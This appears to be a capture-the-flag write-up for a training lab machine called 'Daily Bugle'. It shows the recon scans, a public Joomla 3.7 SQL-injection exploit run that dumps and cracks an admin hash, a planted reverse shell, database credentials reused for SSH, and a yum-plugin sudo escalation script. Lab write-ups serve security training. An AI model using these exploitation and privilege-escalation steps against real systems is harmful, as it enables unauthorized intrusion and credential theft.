Daily_Bugle.doc
-------------------

name : Eviyatar Cohen

Date : 13.10.2022

IP=10.10.184.82
-----------------------------------------

Nmap Results:
===============
nmap -sC -sV 10.10.184.82 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-13 03:25 EDT
Nmap scan report for 10.10.184.82
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.43 seconds

------------------------------------------------------------------

robots.txt
=============
/joomla (Not Found)
/administrator (Login Page!!)
/bin (empty)
/cache (empty)
/cli (empty)
/components (empty)
/includes (empty)
/installation (Not Found)
/language (empty)
/layouts (empty)
/libraries (empty)
/logs (Not Found)
/modules (empty)
/plugins (empty)
/tmp (empty)
------------------------------------------------------------------

GoBuster Results:
==================
gobuster dir -u http://10.10.184.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.184.82/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/13 04:28:21 Starting gobuster in directory enumeration mode
===============================================================
/README.txt           (Status: 200) [Size: 4494]
/images               (Status: 301) [Size: 235] [--> http://10.10.184.82/images/]
/media                (Status: 301) [Size: 234] [--> http://10.10.184.82/media/] 
/templates            (Status: 301) [Size: 238] [--> http://10.10.184.82/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.184.82/modules/]  
/bin                  (Status: 301) [Size: 232] [--> http://10.10.184.82/bin/]      
/plugins              (Status: 301) [Size: 236] [--> http://10.10.184.82/plugins/]  
/includes             (Status: 301) [Size: 237] [--> http://10.10.184.82/includes/] 
/language             (Status: 301) [Size: 237] [--> http://10.10.184.82/language/] 
/components           (Status: 301) [Size: 239] [--> http://10.10.184.82/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.184.82/cache/]     
/libraries            (Status: 301) [Size: 238] [--> http://10.10.184.82/libraries/] 
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.184.82/tmp/]       
/layouts              (Status: 301) [Size: 236] [--> http://10.10.184.82/layouts/]   
/administrator        (Status: 301) [Size: 242] [--> http://10.10.184.82/administrator/]

------------------------------------------------------------------

in README.txt was The Version 3.7 and i found link to exploit this version here:
--------------------------------------------------------------
https://github.com/XiphosResearch/exploits/tree/master/Joomblah

==================================================================

python2 Joombla.py http://10.10.184.82/

 [-] Fetching CSRF token
 [-] Testing SQLi
=============================
  -  Found table: fb9j5_users
==============================
  -  Extracting users from fb9j5_users
==============================================
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
 ============================================================
  -  Extracting sessions from fb9j5_session

Potential User:
===============
jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

Trying Crack With John And Got Final Credentials!!:
===================================================
jonah:spiderman123

in the Jommla Blog Portal I Used the index.php file in beez3 to put there a script for reverse shell

inside the system was a configuration.php file in the /var/www/html directory and inside was creds for MariaDB :
----------------------------------------------------------------
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';

==================================================================
Used The Password To login into jjameson User And got in!!
============================================================
jjameson:'nv5uz9r3ZEDzVjNu'

User Flag: 27a260fe3cba712cfdedb1c86d80442e

in sudo -l was yum without Password in sudo so i GTFObins That:
=================================================================

Script I Used To Get Root:
==========================
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

------------------------------------------------------------------

Root Flag: eec3d53292b1821868266858d7fa6f79

